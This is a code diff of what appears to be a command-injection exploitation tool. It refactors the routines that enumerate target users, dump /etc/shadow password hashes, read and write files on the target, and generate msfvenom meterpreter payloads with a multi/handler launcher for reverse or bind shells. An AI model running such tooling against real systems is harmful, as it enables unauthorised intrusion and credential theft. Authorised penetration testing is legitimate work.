                   warn_msg = "It seems '" + settings.PASSWD_FILE + "' file is not in the "
                   warn_msg += "appropriate format. Thus, exporting it as a text file."
                   settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
-                sys_users = " ".join(str(p) for p in sys_users.split(":"))
-                settings.print_data_to_stdout(sys_users)
-                with open(filename, 'a', encoding=settings.DEFAULT_CODEC) as output_file:
-                  if not menu.options.no_logging:
-                    output_file.write("      " + sys_users)
+                raw_line = " ".join(str(p) for p in fields)
+                settings.print_data_to_stdout(raw_line)
+                logs.add_line(filename, "      " + raw_line, group="users")
+
+            # Per-user privileges, only when explicitly requested.
+            if menu.options.privileges and parsed_users:
+              fetch_msg = "Fetching operating system users privileges. "
+              settings.print_data_to_stdout(settings.print_info_msg(fetch_msg))
+              info_msg = "Operating system"
+              info_msg += " user" + ('s', '')[len(parsed_users) == 1]
+              info_msg += " privileges [" + str(len(parsed_users)) + "]:"
+              settings.print_data_to_stdout(Style.BRIGHT + info_msg + Style.RESET_ALL)
+              logs.add_line(filename, info_msg, group="privileges")
+              for name, uid, homedir in parsed_users:
+                label = classify_uid(uid)
+                note = " (" + label + ", uid=" + uid + ", home directory '" + homedir + "')" if label else " (uid=" + uid + ", home directory '" + homedir + "')"
+                settings.print_data_to_stdout("  " + settings.SUB_CONTENT_SIGN_TYPE + name + note)
+                logs.add_line(filename, "  * " + name + note, group="privileges")
       else:
         warn_msg = "It seems you do not have permission "
         warn_msg += "to read the contents of the file '" + settings.PASSWD_FILE + "'."
@@ -2736,20 +2685,17 @@ def print_users(sys_users, filename, _, separator, TAG, cmd, prefix, suffix, whi
 Print users enumeration.
 """
 def print_passes(sys_passes, filename, _, interpreter):
-  if sys_passes == "":
-    sys_passes = settings.SINGLE_WHITESPACE
+  if sys_passes:
+    sys_passes = "".join(str(p) for p in sys_passes).strip()
     sys_passes = sys_passes.replace(settings.SINGLE_WHITESPACE, settings.END_LINE.LF).split()
     if len(sys_passes) != 0 :
       if settings.VERBOSITY_LEVEL == 0 and _:
         settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
-      info_msg = "Identified operating system"
+      info_msg = "Operating system"
       info_msg += " user" + ('s', '')[len(sys_passes) == 1]
       info_msg += " password hashes [" + str(len(sys_passes)) + "]:"
-      settings.print_data_to_stdout(settings.print_bold_info_msg(info_msg))
-      # Add infos to logs file.
-      with open(filename, 'a', encoding=settings.DEFAULT_CODEC) as output_file:
-        if not menu.options.no_logging:
-          output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg )
+      settings.print_data_to_stdout(info_msg)
+      logs.add_line(filename, info_msg, group="passwords")
       count = 0
       for line in sys_passes:
         count = count + 1
@@ -2757,13 +2703,8 @@ def print_passes(sys_passes, filename, _, interpreter):
           if ":" in line:
             fields = line.split(":")
             if not "*" in fields[1] and not "!" in fields[1] and fields[1] != "":
-              settings.print_data_to_stdout("  (" +str(count)+ ") " + Style.BRIGHT + fields[0] + Style.RESET_ALL + " : " + Style.BRIGHT + fields[1]+ Style.RESET_ALL)
-              # Add infos to logs file.
-              with open(filename, 'a', encoding=settings.DEFAULT_CODEC) as output_file:
-                if not menu.options.no_logging:
-                  if count == 1 :
-                    output_file.write(settings.END_LINE.LF)
-                  output_file.write("(" +str(count)+ ") " + fields[0] + " : " + fields[1] + settings.END_LINE.LF)
+              settings.print_data_to_stdout("  " + settings.SUB_CONTENT_SIGN_TYPE + fields[0] + ":" + fields[1])
+              logs.add_line(filename, "  * " + fields[0] + ":" + fields[1], group="passwords")
         # Check for appropriate '/etc/shadow' format.
         except IndexError:
           if count == 1 :
@@ -2771,27 +2712,89 @@ def print_passes(sys_passes, filename, _, interpreter):
             warn_msg += "in the appropriate format. Thus, exporting it as a text file."
             settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
           settings.print_data_to_stdout(fields[0])
-          with open(filename, 'a', encoding=settings.DEFAULT_CODEC) as output_file:
-            if not menu.options.no_logging:
-              output_file.write("      " + fields[0])
+          logs.add_line(filename, "      " + fields[0], group="passwords")
     else:
-      warn_msg = "It seems you do not have permission "
-      warn_msg += "to read the contents of the file '" + settings.SHADOW_FILE + "'."
-      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+      err_msg = "Unable to retrieve the password hashes for the operating system users."
+      settings.print_data_to_stdout(settings.print_error_msg(err_msg))
+  else:
+    err_msg = "Unable to retrieve the password hashes for the operating system users."
+    settings.print_data_to_stdout(settings.print_error_msg(err_msg))
+
+"""
+Run the standard enumeration checks via the given execute_cmd(cmd) -> output callback - the shared logic behind any module's own enumeration entry point (see shellshock.py).
+"""
+def run_enumeration(execute_cmd, filename, url):
+  ran = False
+
+  if menu.options.hostname:
+    ran = True
+    print_enumenation().hostname_msg()
+    shell = execute_cmd(settings.HOSTNAME)
+    if shell:
+      print_hostname(shell, filename, False)
+
+  if menu.options.current_user:
+    ran = True
+    print_enumenation().current_user_msg()
+    shell = execute_cmd(settings.CURRENT_USER)
+    if shell:
+      print_current_user(shell, filename, False)
+
+  if menu.options.is_root:
+    ran = True
+    print_enumenation().check_privs_msg()
+    cmd = remove_parenthesis(''.join(re.findall(r"\$(.*)", settings.IS_ROOT)))
+    shell = execute_cmd(cmd)
+    if shell:
+      print_current_user_privs(shell, filename, False)
+
+  if menu.options.sys_info:
+    ran = True
+    print_enumenation().os_info_msg()
+    target_os = execute_cmd(settings.RECOGNISE_OS)
+    if target_os == "Linux":
+      distro_name = execute_cmd(settings.DISTRO_INFO)
+      if distro_name:
+        target_os = target_os + settings.SINGLE_WHITESPACE + distro_name
+      target_arch = execute_cmd(settings.RECOGNISE_HP)
+      print_os_info(target_os, target_arch, filename, False)
+
+  if menu.options.users:
+    ran = True
+    print_enumenation().print_users_msg()
+    cmd = remove_command_substitution(settings.SYS_USERS)
+    shell = execute_cmd(cmd)
+    if shell:
+      print_users(shell, filename, False, None, None, cmd, None, None, None, None, url, None, interpreter=False)
+
+  if menu.options.passwords:
+    ran = True
+    print_enumenation().print_passes_msg()
+    cmd = remove_command_substitution(settings.SYS_PASSES)
+    shell = execute_cmd(cmd)
+    if shell:
+      print_passes(shell, filename, False, interpreter=False)
+
+  if ran:
+    settings.ENUMERATION_DONE = True
+
+"""
+Run the single --os-cmd execution via the given execute_cmd(cmd) -> output callback.
+"""
+def run_single_os_cmd(execute_cmd, filename):
+  cmd = menu.options.os_cmd
+  print_enumenation().print_single_os_cmd_msg(cmd)
+  shell = execute_cmd(cmd)
+  print_single_os_cmd(cmd, shell, filename)
 
 """
 Print single OS command
 """
 def print_single_os_cmd(cmd, output, filename):
   if len(output) > 1:
-    _ = "'" + cmd + "' execution output"
-    settings.print_data_to_stdout(settings.print_retrieved_data(_, output))
-    try:
-      with open(filename, 'a', encoding=settings.DEFAULT_CODEC) as output_file:
-        if not menu.options.no_logging:
-          output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + "User-supplied command " + _ + ": " + str(output.encode(settings.DEFAULT_CODEC).decode()) + settings.END_LINE.LF)
-    except TypeError:
-      pass
+    settings.print_data_to_stdout(settings.print_retrieved_data("Execution output", output))
+    logs.add_line(filename, "Executed command: " + cmd, group="command:" + cmd)
+    logs.add_line(filename, str(output), group="command:" + cmd)
   else:
     err_msg = common.invalid_cmd_output(cmd)
     settings.print_data_to_stdout(settings.print_error_msg(err_msg))
@@ -2835,7 +2838,6 @@ def escape_single_quoted_cmd(cmd):
 Find filename
 """
 def find_filename(dest_to_write, content):
-  # Build absolute paths to avoid relying on the shell's working directory.
   norm_dest = dest_to_write.replace("\\", "/")
   dirpath = os.path.dirname(norm_dest)
   fname = norm_dest
@@ -2940,11 +2942,7 @@ def file_read_status(shell, file_to_read, filename):
   if shell:
     _ = "Retrieved file content"
     settings.print_data_to_stdout(settings.print_retrieved_data(_, shell))
-    if not menu.options.no_logging:
-      with open(filename, 'a', encoding=settings.DEFAULT_CODEC) as output_file:
-        info_msg = "Extracted content of the file '"
-        info_msg += file_to_read + "' : " + shell + settings.END_LINE.LF
-        output_file.write(re.compile(settings.ANSI_COLOR_REMOVAL).sub("",settings.INFO_BOLD_SIGN) + info_msg)
+    logs.add_line(filename, "Extracted content of the file '" + file_to_read + "': " + shell, group="file:" + file_to_read)
   else:
     warn_msg = "Retrieved no content for the file '" + file_to_read + "'. "
     warn_msg += "This could mean the file does not exist, is empty, or you do not have permission to read it."
@@ -3014,6 +3012,28 @@ def file_write_status(shell, dest_to_write):
     settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
 
 
+"""
+Run the standard file-access checks via the given execute_cmd(cmd) -> output callback - the shared logic behind any module's own file-access entry point (see shellshock.py).
+"""
+def run_file_access(execute_cmd, filename):
+  ran = False
+
+  if menu.options.file_write:
+    ran = True
+    file_to_write, dest_to_write, content = check_file_to_write()
+    execute_cmd(write_content(content, dest_to_write))
+    shell = execute_cmd(remove_command_substitution(check_file(dest_to_write)))
+    file_write_status(shell, dest_to_write)
+
+  if menu.options.file_read:
+    ran = True
+    cmd, file_to_read = file_content_to_read()
+    shell = execute_cmd(remove_command_substitution(cmd))
+    file_read_status(shell, file_to_read, filename)
+
+  if ran:
+    settings.FILE_ACCESS_DONE = True
+
 def define_vulnerable_http_header(http_header_name):
   if http_header_name == settings.USER_AGENT.lower():
     settings.USER_AGENT_INJECTION = True
@@ -3049,7 +3069,7 @@ def setting_writable_dir(path):
       debug_msg = "Using '" + path + "' for writable directory."
       settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
     info_msg = "Attempting to create a file in directory '" + path
-    info_msg += "' for command execution output. "
+    info_msg += "' for execution output. "
     settings.print_data_to_stdout(settings.print_info_msg(info_msg))
 
 """
@@ -3076,7 +3096,7 @@ def define_py_working_dir():
 """
 Checks for identified vulnerable parameter
 """
-def identified_vulnerable_param(url, technique, injection_type, vuln_parameter, payload, http_request_method, filename, export_injection_info, vp_flag, counter):
+def identified_vulnerable_param(url, technique, injection_type, vuln_parameter, payload, http_request_method, filename, counter, title=None):
   # Check injection state
   settings.DETECTION_PHASE = False
   settings.EXPLOITATION_PHASE = True
@@ -3117,38 +3137,59 @@ def identified_vulnerable_param(url, technique, injection_type, vuln_parameter, 
   if len(found_vuln_parameter) != 0 :
     found_vuln_parameter = " '" +  found_vuln_parameter + Style.RESET_ALL  + Style.BRIGHT + "'"
 
-  # Print the findings to log file.
-  if export_injection_info == False:
-    export_injection_info = logs.add_type_and_technique(export_injection_info, filename, injection_type, technique)
-  if vp_flag == True:
-    vp_flag = logs.add_parameter(vp_flag, filename, the_type, header_name, http_request_method, vuln_parameter, payload)
-  logs.update_payload(filename, counter, payload)
-  counter = counter + 1
+  announce_vulnerable_finding(filename, injection_type, technique, the_type, header_name, http_request_method, vuln_parameter, payload, counter, title=title)
+
+"""
+Drop the "command injection"/"injection" filler word from a technique name, for the terse
+inline "appears to be injectable via ..." message - the stored/summary form keeps it.
+"""
+def short_technique_label(technique):
+  return technique_display_name(technique).replace("command injection ", "").replace("injection ", "")
+
+"""
+Full label of a technique, with its injection type - "classic results-based technique".
+"""
+def technique_label(injection_type, technique):
+  name = short_technique_label(technique)
+  if name.endswith(" technique"):
+    name = name[:-len(" technique")]
+  return name + settings.SINGLE_WHITESPACE + injection_type.split(settings.SINGLE_WHITESPACE)[0] + " technique"
+
+"""
+Display name of a technique - a "/tmp/" output file is a file-based mechanism, not its own technique.
+"""
+def technique_display_name(technique):
+  if technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
+    return settings.INJECTION_TECHNIQUE.FILE_BASED
+  return technique
+
+"""
+Record a newly-identified injectable finding to the log file and terminal - the shared tail of identified_vulnerable_param() above, reusable by modules (see shellshock.py) with their own header_name/the_type.
+"""
+def announce_vulnerable_finding(filename, injection_type, technique, the_type, header_name, http_request_method, vuln_parameter, payload, counter, type_prefix="", decode_payload=True, title=None):
+  display_method = "HTTP Header" if "header" in the_type.lower() else http_request_method
+  logs.add_finding(filename, injection_type, technique, display_method, vuln_parameter, payload, title)
 
   if not settings.LOAD_SESSION:
     if settings.VERBOSITY_LEVEL == 0:
       settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
-    else:
-      total_of_requests()
 
-  # Print the findings to terminal.
-  info_msg = settings.CHECKING_PARAMETER + " appears to be injectable via "
-  info_msg += "(" + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ") " + technique + "."
+  info_msg = settings.CHECKING_PARAMETER + " appears to be injectable via " + type_prefix + technique_label(injection_type, technique) + "."
   settings.print_data_to_stdout(settings.print_bold_info_msg(info_msg))
-  sub_content = str(url_decode(payload))
-  settings.print_data_to_stdout(settings.print_sub_content(sub_content))
+  decoded_payload = str(url_decode(payload)) if decode_payload else payload
+  if not settings.LOAD_SESSION:
+    settings.CONFIRMED_INJECTION_POINTS.append((technique, injection_type, vuln_parameter, decoded_payload, display_method, settings.TOTAL_OF_REQUESTS, title))
 
 """
 Finalize injection process
 """
-def finalize(exit_loops, no_result, float_percent, injection_type, technique, shell):
+def finalize(exit_loops, no_result, i, total, injection_type, technique, shell):
   if exit_loops == False:
     if settings.VERBOSITY_LEVEL == 0:
-      percent = print_percentage(float_percent, no_result, shell)
-      injection_process(injection_type, technique, percent)
-      return True
-    else:
-      return True
+      # Finished means a shell was found, or every combination was tried without one.
+      done = bool(shell) or (no_result and total and i >= total)
+      injection_process(injection_type, technique, done=done, i=i, total=total)
+    return True
   else:
     return False
 
@@ -3194,10 +3235,9 @@ def custom_web_root(url, timesec, filename, http_request_method, url_time_respon
 
 
 """
-Return TEMP path for win / *nix targets.
+TEMP path for win/*nix, without touching WEB_ROOT or prompting.
 """
-def check_tmp_path(url, timesec, filename, http_request_method, url_time_response):
-  # Set temp path
+def default_tmp_path():
   if settings.TARGET_OS == settings.OS.WINDOWS:
     if "microsoft-iis" in settings.SERVER_BANNER.lower():
       settings.TMP_PATH = "C:\\Windows\\TEMP\\"
@@ -3205,12 +3245,13 @@ def check_tmp_path(url, timesec, filename, http_request_method, url_time_respons
       settings.TMP_PATH = "%temp%\\"
   else:
     settings.TMP_PATH = "/tmp/"
+  return normalize_target_dir(menu.options.tmp_path or settings.TMP_PATH)
 
-  if menu.options.tmp_path:
-    tmp_path = menu.options.tmp_path
-  else:
-    tmp_path = settings.TMP_PATH
-  tmp_path = normalize_target_dir(tmp_path)
+"""
+Return TEMP path for win / *nix targets.
+"""
+def check_tmp_path(url, timesec, filename, http_request_method, url_time_response):
+  tmp_path = default_tmp_path()
 
   if not settings.LOAD_SESSION and settings.DEFAULT_WEB_ROOT != settings.WEB_ROOT:
     settings.WEB_ROOT = settings.DEFAULT_WEB_ROOT
@@ -3239,14 +3280,9 @@ def tfb_controller(no_result, url, timesec, filename, tmp_path, http_request_met
     from src.core.injections.semiblind.techniques.tempfile_based import tfb_handler
     path = tmp_path
     setting_writable_dir(path)
-    # Runs mid file-based-technique, so label the detour or it reads as file-based's
-    # own result showing up in the wrong place.
-    info_msg = "Switching to the tempfile-based injection technique."
-    settings.print_data_to_stdout(settings.print_info_msg(info_msg))
-    settings.SKIP_NEXT_TECHNIQUE_TITLE = settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED
     call_tfb = tfb_handler.exploitation(url, timesec, filename, tmp_path, http_request_method, url_time_response)
     if call_tfb == False:
-      info_msg = "Resuming the file-based command injection technique tests."
+      info_msg = "Resuming the " + settings.INJECTION_TECHNIQUE.FILE_BASED + " tests."
       settings.print_data_to_stdout(settings.print_info_msg(info_msg))
     return call_tfb
   else:
@@ -3258,11 +3294,10 @@ Check if to use the "/tmp/" directory for tempfile-based technique.
 def use_temp_folder(no_result, url, timesec, filename, http_request_method, url_time_response):
   tmp_path = check_tmp_path(url, timesec, filename, http_request_method, url_time_response)
   while True:
-    message = "Insufficient permissions on directory '" + settings.WEB_ROOT + "'. "
+    message = "Unable to write to '" + settings.WEB_ROOT + "'. "
     message += "Do you want to use '" + tmp_path + "' instead? [Y/n] "
     tmp_upload = common.read_input(message, default="Y", check_batch=True)
     if tmp_upload in settings.CHOICE_YES:
-      exit_loops = True
       settings.TEMPFILE_BASED_STATE = True
       call_tfb = tfb_controller(no_result, url, timesec, filename, tmp_path, http_request_method, url_time_response)
       if call_tfb != False:
@@ -3291,12 +3326,11 @@ def time_related_timesec():
     min_safe_delay = max(settings.MIN_SAFE_TIMESEC_UNSTABLE, settings.UNSTABLE_REQUEST_BUMPS)
   else:
     min_safe_delay = settings.MIN_SAFE_TIMESEC
-  # Never start below the measured baseline, or normal slow responses look delayed.
-  # x2: detection-phase checks run before the adaptive baseline has enough samples to take over, so this flat margin needs to hold up on its own.
   if settings.URL_TIME_RESPONSE:
     min_safe_delay = max(min_safe_delay, settings.URL_TIME_RESPONSE + settings.TIME_DELAY_STEP * 2)
   if settings.TIME_RELATED_ATTACK and settings.TIMESEC < min_safe_delay:
-    if settings.VERBOSITY_LEVEL != 0:
+    if settings.VERBOSITY_LEVEL != 0 and min_safe_delay != settings.REPORTED_MIN_SAFE_TIMESEC:
+      settings.REPORTED_MIN_SAFE_TIMESEC = min_safe_delay
       debug_msg = "Adjusting '--time-sec' to minimum safe delay of " + str(min_safe_delay) + " second" + ("s" if min_safe_delay > 1 else "") + ". In case of inconsistencies, it will be auto-increased."
       settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
     return min_safe_delay
@@ -3334,12 +3368,7 @@ def time_related_export_injection_results(cmd, separator, output, check_exec_tim
 Success msg.
 """
 def shell_success(option):
-  info_msg = "Sending payload to target, for " + option + " TCP connection "
-  if settings.BIND_TCP:
-    info_msg += "against " + settings.RHOST 
-  else:
-    info_msg += "on " + settings.LHOST 
-  info_msg += ":" + settings.LPORT + "."
+  info_msg = "Sending selected payload to the target."
   settings.print_data_to_stdout(settings.print_info_msg(info_msg))
 
 """
@@ -3357,6 +3386,54 @@ def windows_only_attack_vector():
     settings.print_data_to_stdout(settings.print_error_msg(error_msg))
 
 """
+Append the separator once more if a custom injection marker changed where the payload lands - the shared tail repeated across every payloads.py.
+"""
+def append_custom_marker(payload, separator):
+  if settings.CUSTOM_INJECTION_MARKER:
+    return payload + separator
+  return payload
+
+"""
+Rewrite LF characters in a file-based payload for header-based injection modes, or CRLF-normalize for non-Windows targets - the shared "new line fixation" logic in fb_payloads.py.
+"""
+def fix_newlines_for_headers(payload, separator):
+  if settings.USER_AGENT_INJECTION or settings.REFERER_INJECTION or settings.HOST_INJECTION or settings.CUSTOM_HEADER_INJECTION:
+    return payload.replace(settings.END_LINE.LF, separator)
+  if settings.TARGET_OS != settings.OS.WINDOWS:
+    return payload.replace(settings.END_LINE.LF, "%0d")
+  return payload
+
+"""
+Generate an msfvenom payload and write its multi/handler .rc launcher, returning the payload's raw output - the shared logic behind bind_tcp.py's/reverse_tcp.py's PHP and Python meterpreter/bind shell options.
+"""
+def generate_msf_payload(payload, output, host_key, host_value, extra_msfvenom_args, strip_newlines):
+  subprocess.Popen(
+    "msfvenom -p " + str(payload) +
+    " " + host_key + "=" + str(host_value) +
+    " LPORT=" + str(settings.LPORT) +
+    extra_msfvenom_args + " -o " + output + settings.NO_OUTPUT,
+    shell=True
+  ).wait()
+
+  with open(output, "r+" if strip_newlines else "r") as content_file:
+    data = ''.join(content_file.readlines())
+    if strip_newlines:
+      data = data.replace(settings.END_LINE.LF, settings.SINGLE_WHITESPACE)
+
+  settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
+  os.remove(output)
+
+  with open(output, 'w+') as filewrite:
+    filewrite.write(
+      "use exploit/multi/handler" + settings.END_LINE.LF +
+      "set payload " + payload + settings.END_LINE.LF +
+      "set " + host_key.lower() + " " + str(host_value) + settings.END_LINE.LF +
+      "set lport " + str(settings.LPORT) + settings.END_LINE.LF +
+      "exploit" + settings.END_LINE.LF * 2
+    )
+  return data
+
+"""
 Message regarding the MSF handler.
 """
 def msf_launch_msg(output):
@@ -3372,10 +3449,7 @@ def msf_launch_msg(output):
 Check for available shell options.
 """
 def shell_options(option):
-  if option.lower() == "reverse_tcp" or option.lower() == "bind_tcp" :
-    warn_msg = "You are in the '" + option.lower() + "' mode."
-    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
-  elif option.lower() == "?":
+  if option.lower() == "?":
     menu.reverse_tcp_options()
   elif option.lower() == "quit" or option.lower() == "exit":
     raise SystemExit()
@@ -3395,13 +3469,14 @@ def shell_options(option):
         settings.print_data_to_stdout(settings.print_error_msg(err_msg))
       else:
         check_rhost(option[10:])
-    if option.lower() == "reverse_tcp":    
+    if option.lower() == "reverse_tcp":
       if option[4:10].lower() == "lport ":
         check_lport(option[10:])
       if option[4:12].lower() == "srvport ":
         check_srvport(option[12:])
       if option[4:12].lower() == "uripath ":
         check_uripath(option[12:])
+
   else:
     return option
 
@@ -3430,7 +3505,7 @@ Set up the Python working directory on the target host.
 def set_python_working_dir():
   while True:
     message = "Do you want to use '" + settings.WIN_PYTHON_INTERPRETER
-    message += "' as Python interpreter on the target host? [Y/n] "
+    message += "' as default Python interpreter on the target host? [Y/n] "
     python_dir = common.read_input(message, default="Y", check_batch=True)
     if python_dir in settings.CHOICE_YES:
       break
@@ -3446,21 +3521,30 @@ def set_python_working_dir():
 """
 Check if to use '/bin' standard subdirectory
 """
+"""
+A random path under '/tmp' - a fixed name would clash between concurrent sessions and is trivially predictable.
+"""
+def random_tmp_path(length=5):
+  return "/tmp/" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
+
 def use_bin_subdir(nc_alternative, shell):
-  while True:
-    message = "Do you want to use '/bin' standard subdirectory? [y/N] "
+  # Asked once per run - every "run" re-asking the same question is just noise.
+  while settings.USE_BIN_SUBDIR_CHOICE is None:
+    message = "Use '/bin/' as the path prefix for shell and netcat? [y/N] "
     enable_bin_subdir = common.read_input(message, default="N", check_batch=True)
     if enable_bin_subdir in settings.CHOICE_YES :
-      nc_alternative = "/bin/" + nc_alternative
-      shell = "/bin/" + shell
-      return nc_alternative, shell
+      settings.USE_BIN_SUBDIR_CHOICE = True
     elif enable_bin_subdir in settings.CHOICE_NO:
-      return nc_alternative, shell
+      settings.USE_BIN_SUBDIR_CHOICE = False
     elif enable_bin_subdir in settings.CHOICE_QUIT:
       raise SystemExit()
     else:
       common.invalid_option(enable_bin_subdir)
       pass
+
+  if settings.USE_BIN_SUBDIR_CHOICE:
+    return "/bin/" + nc_alternative, "/bin/" + shell
+  return nc_alternative, shell
 
 """
 Set up the Python interpreter on linux target host.
@@ -3468,7 +3552,7 @@ Set up the Python interpreter on linux target host.
 def set_python_interpreter():
   while True:
     message = "Do you want to use '" + settings.LINUX_PYTHON_INTERPRETER
-    message += "' as Python interpreter on the target host? [Y/n] "
+    message += "' as default Python interpreter on the target host? [Y/n] "
     python_interpreter = common.read_input(message, default="Y", check_batch=True)
     if python_interpreter in settings.CHOICE_YES:
       break
@@ -3569,5 +3653,21 @@ def check_uripath(uripath):
   settings.URIPATH = uripath
   settings.print_data_to_stdout("URIPATH => " + settings.URIPATH)
   return True
-  
+
+"""
+check / set handler option - catch the shell with a built-in listener instead of an external nc/ncat.
+"""
+def check_handler(value):
+  value = value.strip().lower()
+  if value in settings.CHOICE_YES or value in ("on", "1", "true"):
+    settings.HANDLER = True
+  elif value in settings.CHOICE_NO or value in ("off", "0", "false"):
+    settings.HANDLER = False
+  else:
+    err_msg = "The 'HANDLER' option accepts on/off (or yes/no, true/false)."
+    settings.print_data_to_stdout(settings.print_error_msg(err_msg))
+    return False
+  settings.print_data_to_stdout("HANDLER => " + ("on" if settings.HANDLER else "off"))
+  return True
+
 # eof
